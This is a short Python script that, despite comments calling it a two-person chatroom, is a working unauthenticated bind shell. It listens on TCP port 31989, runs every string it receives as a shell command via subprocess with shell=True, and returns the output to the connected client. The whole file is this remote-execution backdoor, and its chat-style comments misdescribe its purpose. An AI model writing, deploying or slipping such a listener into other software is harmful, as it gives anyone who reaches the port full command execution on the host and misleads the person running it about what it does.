import socket, time, sys, os, subprocess

class socket_server:
    def get_ip_address(self):
        #Gets IP address
        ip_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        ip_socket.connect(('8.8.8.8', 80))
        ip_address = ip_socket.getsockname()[0]
        return ip_address

    def __init__(self):
        #This functions as the receiver.
        print('Your messages will appear here.')
        port = 31989
        #this chatroom is only for two people.
        max_number_of_guests = 1
        maximum_size = 16384
        #Creates a TCP socket.
        shell_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        my_ip_address = self.get_ip_address()
        #Prints the server's address
        print('Working IP address:', my_ip_address)
        #Opens up a socket for connections.
        shell_socket.bind((my_ip_address, port))
        shell_socket.listen(max_number_of_guests)
        #Accepting a socket connection results in a tuple objects, the first is the actual socket whereas the second is the address info.
        (client, address) = shell_socket.accept()
        while 1:
            try:
                received_data = client.recv(maximum_size).decode('UTF-8').lower()
                if received_data == 'quit':
                    shell_socket.close()
                    print('Ending shell.')
                    sys.exit()
                try:
                    command_execution = subprocess.check_output(received_data, shell=True, timeout=20)
                except subprocess.TimeoutExpired:
                    time.sleep(0.5)
                    client.sendall(b'timeout')
                except subprocess.CalledProcessError:
                    time.sleep(0.5)
                    client.sendall(b'pysh: command not found')
                except:
                    error = str(sys.exc_info()[0]).encode('UTF-8')
                    client.sendall(error)
                else:
                    time.sleep(0.5)
                    client.sendall(command_execution)
            except OSError:
                shell_socket.close()

if __name__ == '__main__':
    try:
        instance = socket_server()
    except(KeyboardInterrupt, EOFError):
        print('\nEnding server program.')
